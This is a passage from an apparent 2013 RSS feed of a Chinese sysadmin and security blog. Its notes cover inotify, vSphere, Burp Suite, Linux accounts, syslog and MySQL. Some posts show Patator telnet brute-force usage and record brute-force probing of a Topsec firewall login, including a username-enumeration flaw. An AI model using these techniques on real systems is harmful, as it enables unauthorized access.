&lt;p&gt;&lt;img alt='log' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/win3.png' /&gt; &lt;img alt='log' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/win4.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/09/nessus</link>
                <guid>http://username.github.io/2013/08/09/nessus</guid>
                <pubDate>2013-08-09T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>使用inotify监控linux文件系统</title>
                <description>&lt;h2 id='id2554'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.infoq.com/cn/articles/inotify-linux-file-system-event-monitoring#anch61060'&gt;Inotify: 高效、实时的Linux文件系统事件监控框架&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://blog.sina.com.cn/s/blog_6e2aeba301011260.html'&gt;Centos install inotifywait&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='inotify'&gt;验证系统是否支持inotify&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;grep INOTIFY_USER /boot/config-$(uname -r)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果输出为CONFIG_INOTIFY_USER=y，说明内核支持inotify机制。&lt;/p&gt;

&lt;h2 id='centos_inotifywait'&gt;centos 安装inotifywait&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;wget http://cloud.github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz

tar -zxvf inotify-tools-3.14.tar.gz

cd inotify-tools-3.14

./configure

make

make install

updatedb

inotifywait -mrq -e modify,delete,create,attrib PATH
-m 是保持一直监听
-r 是递归查看目录
-q 是打印出事件
-e create,move,delete,modify,attrib 是指 “监听 创建 移动 删除 写入 权限” 事件&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/08/09/inotifylinux</link>
                <guid>http://username.github.io/2013/08/09/inotifylinux</guid>
                <pubDate>2013-08-09T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>vmware vsphere ESXi 5.0.0.0 使用记录</title>
                <description>&lt;h2 id='id2552'&gt;克隆机器&lt;/h2&gt;

&lt;p&gt;文件菜单中没有找到模板的菜单项。探索了一番，用先导出，再部署OVF模板的方式实现了克隆。。。要是一台一台装可让人怎么活啊。&lt;/p&gt;

&lt;p&gt;今天再次使用的发现备份ovf只能备份到本地，然后从本地还原。这样子因为从网络走，效率就很低了。采用了另外一种方法。在vsphere的数据存储中把整个虚拟机的文件复制一份，然后新建虚拟机，使用现有虚拟磁盘就可以了。速度很快～～&lt;/p&gt;

&lt;h2 id='id2553'&gt;磁盘置备选项&lt;/h2&gt;

&lt;p&gt;在VMware vSphere 中创建虚拟机，在创建磁盘部分，会出现“磁盘置备”的选项，有三个选择：厚置备延迟置零，厚置备置零，精简置备。&lt;/p&gt;

&lt;p&gt;精简置备性能相对较低，但磁盘利用率较好，适用于磁盘较小的时候。&lt;/p&gt;

&lt;p&gt;参考&lt;a href='http://www.linuxfly.org/post/638/'&gt;linuxfly.org&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/使用记录/2013/08/08/vsphere-esxi-5000-</link>
                <guid>http://username.github.io/使用记录/2013/08/08/vsphere-esxi-5000-</guid>
                <pubDate>2013-08-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>burpsuite 使用记录</title>
                <description>&lt;p&gt;测试的时候用intruder显示starting，一直没有数据显示。注意到alert标签显示time out。怀疑是不是服务端有什么防护，把请求屏蔽掉了。可是用repeat可以正常发送接受数据。实验一下，把useragent改成google可以正常使用intruder。。。看来果然是useragent的关系。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/08/burpsuite-</link>
                <guid>http://username.github.io/2013/08/08/burpsuite-</guid>
                <pubDate>2013-08-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>python获取google的搜索结果</title>
                <description>&lt;h2 id='google_'&gt;google 搜索表单&lt;/h2&gt;

&lt;p&gt;抓包网站备份文件扫描工具3.6获取其抓取google搜索结果的请求为&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /search?q=%E9%A3%9E%E6%9C%BA%E6%9D%AF&amp;amp;num=50&amp;amp;hl=zh-CN&amp;amp;safe=strict&amp;amp;prmd=fd&amp;amp;ei=d3GgTLmnNo_uvQP5_dyNDQ&amp;amp;start=0&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;谷歌搜索表单参数url&lt;a href='http://ylbook.com/cms/web/gugecanshu.htm'&gt;参数详解&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;需要注意的地方是google最多获取1000条搜索结果，每次请求最多可以获取100条搜索结果。默认是10条。&lt;/p&gt;

&lt;p&gt;查了一下资料发现还有两个api可以获取google的搜索结果.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;https://ajax.googleapis.com/ajax/services/search/web?v=1.0&amp;amp;q=
https://www.googleapis.com/customsearch/v1?key=&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;无奈的是api获取到的结果跟网页获取的不完全一样.我需要测试的案例来说.本来有300条结果.api返回只有不到10条.没办法,只能用网页获取了.&lt;/p&gt;

&lt;p&gt;这几个api的一些参考资料&lt;/p&gt;

&lt;p&gt;https://developers.google.com/custom-search/v1/using_rest?hl=zh-CN#query-params&lt;/p&gt;

&lt;p&gt;https://developers.google.com/custom-search/v1/using_rest?hl=zh-CN&lt;/p&gt;

&lt;p&gt;http://www.seotcs.com/blog/3850.html&lt;/p&gt;

&lt;h2 id='python'&gt;python实现&lt;/h2&gt;

&lt;p&gt;找到一个哥们的代码,还不错,稍微改了下就可以用了.只是发现google的检查策略确实很强大,居然可以根据所有的关键字判断是否是恶意搜索.&lt;/p&gt;

&lt;p&gt;&lt;a href='https://github.com/litsand/GoogleSearchCrawler'&gt;github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;话说还有很多想法,想好好实现一下.&lt;/p&gt;

&lt;h2 id='python'&gt;python编程&lt;/h2&gt;

&lt;p&gt;果断需要一直坚持写代码,一段时间不用.语法都忘的差不多了.&lt;/p&gt;

&lt;p&gt;遇到的两个问题,一个是需要检查python发送的数据包调试.把https改成http抓包,分析了数据包.还有一个问题是获取文件中的内容,把换行符也读了进来,结果又看不到换行符,就结了好一会.&lt;/p&gt;</description>
                <link>http://username.github.io/自动化工具/2013/08/07/pythongoogle</link>
                <guid>http://username.github.io/自动化工具/2013/08/07/pythongoogle</guid>
                <pubDate>2013-08-07T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>online tools</title>
                <description>&lt;p&gt;&lt;a href='http://pressbin.com/tools/excel_to_html_table/index.html'&gt;将excel等表格转换成html table代码&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/在线资源/2013/08/07/online-tools</link>
                <guid>http://username.github.io/在线资源/2013/08/07/online-tools</guid>
                <pubDate>2013-08-07T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>linux用户管理(读私房菜笔记)</title>
                <description>&lt;h2 id='linux'&gt;linux帐号和群组&lt;/h2&gt;

&lt;p&gt;系统是通过UID来识别用户的。实验做了一下，确实是这个样子。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;drwxr-xr-x 2 1000 lit 4096 Apr 27 13:36 Music&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='passwd'&gt;passwd文件格式&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;共有7个部分。&lt;/p&gt;

&lt;p&gt;账户名称:密码:UID:GID:说明栏:家目录:shell&lt;/p&gt;

&lt;p&gt;UID为0为系统管理员，可以有多个UID为0的用户。&lt;/p&gt;

&lt;h1 id='shadow'&gt;shadow文件格式&lt;/h1&gt;

&lt;p&gt;因为passwd权限必须设为644,以供其他程序读取。所以密码存放在passwd就很不安全。所以有了shadow文件。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root:$6wpNg5Qu/6x1cc1:15924:0:99999:7:::
daemon:*:15453:0:99999:7:::
bin:*:15453:0:99999:7:::
sys:*:15453:0:99999:7:::
sync:*:15453:0:99999:7:::
games:*:15453:0:99999:7:::&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;共有9个部分。&lt;/p&gt;

&lt;p&gt;帐号名称:密码:最近更改密码的日期:口令不可以被改动的天数（想对于3部分):密码需要重新变更的天数:密码需要变更期限前的警告天数:密码过期后的帐号宽限时间:帐号失效日期:保留备用&lt;/p&gt;

&lt;h1 id='group'&gt;group文件格式&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:and&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;共有4个部分。群组名称:群组密码（通常不需要设定）:GID:群组包含的用户名称&lt;/p&gt;

&lt;h1 id='id2548'&gt;有效群组和初始群组&lt;/h1&gt;

&lt;p&gt;这个概念之前确实没注意过。passwd里的GID是初始群组，group相关的组的行里不需要单独添加了。在group里添加的是次要群组。测试了用当前用户新建文件，群组是用户的初始群组。&lt;/p&gt;

&lt;p&gt;查看当前用户群组的命令 groups和id&lt;/p&gt;

&lt;p&gt;切换有效群组命令 newgrp 群组名。是新开了一个shell，赋予新的GID，所以可以用exit命令退出，返回到之前的shell中。&lt;/p&gt;

&lt;p&gt;添加群组的命令 usermod 和gpasswd&lt;/p&gt;

&lt;h1 id='gshadow'&gt;gshadow文件格式&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;root:*::
daemon:*::
bin:*::
sys:*::
adm:*::litsand
tty:*::
disk:*::
lp:*::&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;共4栏。群组名称:群组密码:群组管理员:群组成员&lt;/p&gt;

&lt;h1 id='id2549'&gt;帐号管理&lt;/h1&gt;

&lt;p&gt;相关命令 useradd,usermod,userdel&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;useradd -D 显示默认账户参数&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;非交互式修改修改密码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo &amp;quot;abc543CC&amp;quot; | passwd --stdin vbird2&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(ubuntu12.04 的passwd没有&amp;#8211;stdin的选项了)关于修改密码的命令参考这里&lt;a href='http://leslie-chu.blog.163.com/blog/static/19986324320122711727378/'&gt;自动脚本初始化用户密码&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;usermod 修改账户的参数

userdel -r test 连同用户家目录一起删除

chsh 修改用户的登录shell&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用户组管理:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;groupadd group1 添加用户组
groupmod -g 201 -n mygroup group1 修改组信息
groupdel mygroup 删除用户组
gpasswd group1 创建用户组口令
gpasswd -A user1 group1 设置群组管理员
gpasswd -a user1 group1 把用户加入组.&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='acl'&gt;ACL控制&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;setfacl -m u:user1:rwx a 设置user1对文件a的权限.设置了acl后ls -l 权限部分会有一个加号.

getfacl filename 命令查看acl的文件权限.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ getfacl a
# file: a
# owner: litsand
# group: litsand
user::rw-
user:user1:rwx
group::rw-
mask::rwx
other::r--&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用者或群组所配置的权限必须要存在于 mask 的权限配置范围内才会生效，此即有效权限 (effective permission),即最大的权限不会超过mask的权限.如果mask没有配置写权限,user配置了写权限也是无效的.&lt;/p&gt;

&lt;h2 id='id2550'&gt;使用者身份切换&lt;/h2&gt;

&lt;p&gt;切换的方式有两种 su和sudo&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;su su - 切换为root需要输入root的密码
sudo 运行root权行的命令.输入自己帐号的密码.前提是帐号在sudo组里面.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;su 是使用nonlogin-shell的方式,很多环境变量都不会变化.su -的方式是使用login-shell,环境变量会变化.&lt;/p&gt;

&lt;p&gt;sudo -u也可以切换成任意用户.使用visudo命令,修改/etc/sudoers文件来配置&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用者账号  登陆者的来源主机名=(可切换的身份)  可下达的命令
root                         ALL=(ALL)           ALL   &amp;lt;==这是默认值&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;配置成可以修改其他用户的密码,但是无法修改root的密码:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;myuser1	ALL=(root)  !/usr/bin/passwd, /usr/bin/passwd [A-Za-z]*, !/usr/bin/passwd root&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='pam'&gt;PAM模块&lt;/h2&gt;

&lt;p&gt;Pluggable Authentication Modules,PAM 可以说是一套应用程序编程接口 (Application Programming Interface, API)，他提供了一连串的验证机制，只要使用者将验证阶段的需求告知 PAM 后， PAM 就能够回报使用者验证的结果 (成功或失败)&lt;/p&gt;

&lt;p&gt;pam后门~~&lt;/p&gt;

&lt;h2 id='linux'&gt;linux主机上的用户信息传递&lt;/h2&gt;

&lt;p&gt;查询用户的命令:w, who, last, lastlog,finger,id&lt;/p&gt;

&lt;p&gt;用户聊天的命令:write, mesg, wall 很有意思啊.&lt;/p&gt;

&lt;h2 id='id2551'&gt;手动新增使用者&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;pwck 检查passwd的工具&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pwconv,pwunconv命令最好不要使用.&lt;/p&gt;

&lt;p&gt;手动创建帐号的步骤:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;先创建所需要的群组 ( vi /etc/group )；
将 /etc/group 与 /etc/gshadow 同步化 ( grpconv )；
创建账号的各个属性 ( vi /etc/passwd )；
将 /etc/passwd 与 /etc/shadow 同步化 ( pwconv )；
创建该账号的口令 ( passwd accountname )；
创建用户家目录 ( cp -a /etc/skel /home/accountname )；
更改用户家目录的属性 ( chown -R accountname.group /home/accountname )。&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/技术研究/2013/08/07/linux</link>
                <guid>http://username.github.io/技术研究/2013/08/07/linux</guid>
                <pubDate>2013-08-07T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>syslog 协议简介</title>
                <description>&lt;h2 id='0x00_what_is_syslog'&gt;0x00 what is syslog&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://en.wikipedia.org/wiki/Syslog'&gt;维基百科syslog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.monitorware.com/common/en/articles/syslog-described.php'&gt;introduction to syslog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;syslog是这样一种协议，它允许一台机器通过网络将自己的日志信息发送到日志接受服务器上。syslog消息是基于UDP协议的，消息的长度通常不超过1024个字节。因为基于UDP，所以信息的传输是不可靠的。&lt;/p&gt;

&lt;h2 id='bsd_syslog'&gt;BSD syslog格式&lt;/h2&gt;

&lt;p&gt;有3个独立的部分：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;PRI&lt;/li&gt;

&lt;li&gt;HEADER&lt;/li&gt;

&lt;li&gt;MSG&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id='pri'&gt;PRI&lt;/h1&gt;

&lt;p&gt;pri部分是一个8bit的数字。用尖括号包裹。前3位代表优先级，共有8个优先级。&lt;/p&gt;
&lt;table class='table table-bordered table-striped table-condensed'&gt;
   &lt;tr&gt;
      &lt;td&gt;Numerical Code &lt;/td&gt;
      &lt;td&gt;Severity&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;0 &lt;/td&gt;
      &lt;td&gt;Emergency: system is unusable&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;1 &lt;/td&gt;
      &lt;td&gt;Alert: action must be taken immediately&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;2 &lt;/td&gt;
      &lt;td&gt;Critical: critical conditions&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;3 &lt;/td&gt;
      &lt;td&gt;Error: error conditions&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;4 &lt;/td&gt;
      &lt;td&gt;Warning: warning conditions&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;5 &lt;/td&gt;
      &lt;td&gt;Notice: normal but significant condition&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;6 &lt;/td&gt;
      &lt;td&gt;Informational: informational messages&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;7 &lt;/td&gt;
      &lt;td&gt;Debug: debug-level messages&lt;/td&gt;
   &lt;/tr&gt;
&lt;/table&gt;
&lt;p&gt;后5位代表发送消息的设施（应用程序或产生日志的操作系统组件&lt;/p&gt;
&lt;table&gt;
   &lt;tr&gt;
      &lt;td&gt;Numerical Code &lt;/td&gt;
      &lt;td&gt;Facility&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;0 &lt;/td&gt;
      &lt;td&gt;kernel messages&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;1 &lt;/td&gt;
      &lt;td&gt;user-level messages&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;2 &lt;/td&gt;
      &lt;td&gt;mail system&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;3 &lt;/td&gt;
      &lt;td&gt;system daemons&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;4 &lt;/td&gt;
      &lt;td&gt;security/authorization messages&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;5 &lt;/td&gt;
      &lt;td&gt;messages generated internally by syslogd&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;6 &lt;/td&gt;
      &lt;td&gt;line printer subsystem&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;7 &lt;/td&gt;
      &lt;td&gt;network news subsystem&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;8 &lt;/td&gt;
      &lt;td&gt;UUCP subsystem&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;9 &lt;/td&gt;
      &lt;td&gt;clock daemon&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;10 &lt;/td&gt;
      &lt;td&gt;security/authorization messages&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;11 &lt;/td&gt;
      &lt;td&gt;FTP daemon&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;12 &lt;/td&gt;
      &lt;td&gt;NTP subsystem&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;13 &lt;/td&gt;
      &lt;td&gt;log audit&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;14 &lt;/td&gt;
      &lt;td&gt;log alert&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;15 &lt;/td&gt;
      &lt;td&gt;clock daemon&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;16 &lt;/td&gt;
      &lt;td&gt;local use 0&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;17 &lt;/td&gt;
      &lt;td&gt;local use 1&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;18 &lt;/td&gt;
      &lt;td&gt;local use 2&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;19 &lt;/td&gt;
      &lt;td&gt;local use 3&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;20 &lt;/td&gt;
      &lt;td&gt;local use 4&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;21 &lt;/td&gt;
      &lt;td&gt;local use 5&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;22 &lt;/td&gt;
      &lt;td&gt;local use 6&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;23 &lt;/td&gt;
      &lt;td&gt;local use 7&lt;/td&gt;
   &lt;/tr&gt;
&lt;/table&gt;
&lt;h1 id='header'&gt;header&lt;/h1&gt;

&lt;p&gt;包括时间戳和和设备的主机名或IP。时间戳是设备发送消息时设备自身配置的时间，不是server端接受到的时间。时间戳格式为MMM DD HH:MM:SS&lt;/p&gt;

&lt;h1 id='msg'&gt;msg&lt;/h1&gt;

&lt;p&gt;a）tag field 产生这个消息的程序或进程的名字。&lt;/p&gt;

&lt;p&gt;b) content field 消息的详细信息。&lt;/p&gt;

&lt;h2 id='id2547'&gt;扩展阅读&lt;/h2&gt;

&lt;p&gt;cisco设备的syslog格式,跟unix格式有些小的不同。&lt;a href='http://www.ciscopress.com/articles/article.asp?p=426638'&gt;参考&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.faqs.org/rfcs/rfc3164.html'&gt;bsd syslog protocol&lt;/a&gt; 更全面更广泛的syslog格式 参考&lt;a href='http://tools.ietf.org/html/rfc5424'&gt;rfc5424&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='rfc'&gt;相关rfc&lt;/h2&gt;
&lt;table&gt;
   &lt;tr&gt;
      &lt;td /&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 3164 The BSD syslog Protocol (obsoleted by RFC 5424)&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 3195 Reliable Delivery for syslog&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 5424 The Syslog Protocol&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 5425 TLS Transport Mapping for Syslog&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 5426 Transmission of Syslog Messages over UDP&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 5427 Textual Conventions for Syslog Management&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 5848 Signed Syslog Messages&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 6012 Datagram Transport Layer Security (DTLS) Transport Mapping for Syslog&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td&gt;    RFC 6587 Transmission of Syslog Messages over TCP&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
      &lt;td /&gt;
   &lt;/tr&gt;
&lt;/table&gt;</description>
                <link>http://username.github.io/2013/08/06/syslog-</link>
                <guid>http://username.github.io/2013/08/06/syslog-</guid>
                <pubDate>2013-08-06T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>mysql sql语法备忘</title>
                <description>&lt;h2 id='id2544'&gt;修改数据记录&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;UPDATE &amp;lt;表名&amp;gt; SET &amp;lt;列名&amp;gt;=&amp;lt;表达式&amp;gt; [,&amp;lt;列名&amp;gt;=&amp;lt;表达式&amp;gt;]… [WHERE &amp;lt;条件&amp;gt;]&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='id2545'&gt;案例&lt;/h1&gt;

&lt;p&gt;遇到一个字段名是interval,老是出现sql语法错误，原来是interval是mysql的关键字。用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;update tables t set t.interval=10;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;来修改。&lt;/p&gt;

&lt;h2 id='id2546'&gt;清空表的内容&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;DELETE FROM&amp;lt;表名&amp;gt; [WHERE &amp;lt;条件&amp;gt;]
delete from &amp;lt;tablename&amp;gt; where 1=1;&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/08/05/mysql-sql</link>
                <guid>http://username.github.io/2013/08/05/mysql-sql</guid>
                <pubDate>2013-08-05T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>patator使用指南之破解telnet</title>
                <description>&lt;p&gt;&lt;a href='http://code.google.com/p/patator/'&gt;项目主页&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;话说真的十分的强大和灵活。&lt;/p&gt;

&lt;h2 id='telnet'&gt;破解telnet&lt;/h2&gt;

&lt;p&gt;无参数执行 python patator_v0.5.py 列出所有可用的模块。&lt;/p&gt;

&lt;p&gt;加模块名字，列出该模块的主要参数和用法：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python patator_v0.5.py telnet_login
Patator v0.5 (http://code.google.com/p/patator/)
Usage: telnet_login &amp;lt;module-options ...&amp;gt; [global-options ...]
Examples:
telnet_login host=10.0.0.1 inputs=&amp;#39;FILE0\nFILE1&amp;#39; 0=logins.txt 1=passwords.txt persistent=0 prompt_re=&amp;#39;Username:|Password:&amp;#39; -x ignore:egrep=&amp;#39;Login incorrect.+Username:&amp;#39;

Module options:
host          : target host
port          : target port [23]
inputs        : list of values to input
prompt_re     : regular expression to match prompts [\w+]
timeout       : seconds to wait for a response and for prompt_re to match received data [20]
persistent    : use persistent connections [1|0] 

ERROR: wrong usage. Please read the README inside for more information.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;prompt_re可以自定义提示输入用户名和密码的文字。ignort:egrep可以自定义密码错误时的回显。timeout定义超时，也很有用。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/02/patatortelnet</link>
                <guid>http://username.github.io/2013/08/02/patatortelnet</guid>
                <pubDate>2013-08-02T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>burp suite 之 ssl证书</title>
                <description>&lt;p&gt;burp suite 代理https的时候出现证书的问题，导致无法代理监听数据。按照网上的方法导出证书，导入证书发现没有效果。而且想添加exception的时候出现已经存在有效的证书，导致exception都添加不了。。。google了下。&lt;a href='http://support.mozilla.org/zh-CN/questions/954621'&gt;参照这篇文章&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在历史记录里清空数据，删掉相关的证书，然后采用添加exception的方式临时解决这个问题。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/02/burp-suite--ssl</link>
                <guid>http://username.github.io/2013/08/02/burp-suite--ssl</guid>
                <pubDate>2013-08-02T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>天融信防火墙暴力破解尝试</title>
                <description>&lt;p&gt;经过测试发现，天融信防火墙是对暴力破解有防护的。&lt;/p&gt;

&lt;p&gt;web界面登录，尝试5次左右就会锁定账户，然后2分钟之后会自动解锁。缺陷就是如果用户名不存在会提示用户名不存在。而且不存在的用户名多次尝试也会锁定。&lt;/p&gt;

&lt;p&gt;可以考虑从ssh和telnet破解入手。&lt;/p&gt;

&lt;p&gt;测试了下发现telnet也会锁定账户。。。。。。&lt;/p&gt;

&lt;p&gt;ngfw4000 貌似没有ssh服务。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/08/02/</link>
                <guid>http://username.github.io/2013/08/</guid>
                <pubDate>2013-08-02T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>天融信防火墙配置snmp服务</title>
                <description>&lt;p&gt;测试型号:天融信NGFW 4000&lt;/p&gt;

&lt;h2 id='id2543'&gt;配置过程&lt;/h2&gt;

&lt;p&gt;吐槽：拿到的是一台崭新的机器，一开始觉得天融信的文档做的不错啊，mib的说明文档做的很好。然后开始看光盘里带的手册，怎么开启snmp服务。先添加管理主机呀，然后停止，在启动snmp啊，测试了好几次。都是161端口没响应。重启了两次也没效果。果断google了一下发现要先在配置里开放服务啊。哎呀，这是个防火墙嘛，都防住了怎么访问的到。。。&lt;/p&gt;

&lt;p&gt;&lt;a href='http://wenku.baidu.com/view/ff61c916650e52ea5518982f.html'&gt;果断参考资料&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;系统管理&amp;#8211;配置&amp;#8211;开放服务 添加snmp服务&lt;/p&gt;

&lt;p&gt;然后在网络管理&amp;#8211;snmp 里启动snmp，添加管理主机。&lt;/p&gt;

&lt;p&gt;发现一个问题，原来配置要手动保存，不然重启就没有了。&lt;/p&gt;

&lt;h2 id='console'&gt;配置console连接&lt;/h2&gt;

&lt;p&gt;一开始装了四五个驱动，总是黄色的小叹号，后来换了一根线好了。。。坑。在设备管理器可以看到默认的端口是com1还是com3,我这里显示的是com3.然后putty连接就OK了。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/30/snmp</link>
                <guid>http://username.github.io/2013/07/30/snmp</guid>
                <pubDate>2013-07-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>auth.log 详细分析</title>
                <description>&lt;h1 id='id2541'&gt;文件基本信息&lt;/h1&gt;

&lt;p&gt;Under CentOS / RHEL / Fedora file name is /var/log/secure.Under ubuntu the file name is /var/log auth.log.&lt;/p&gt;

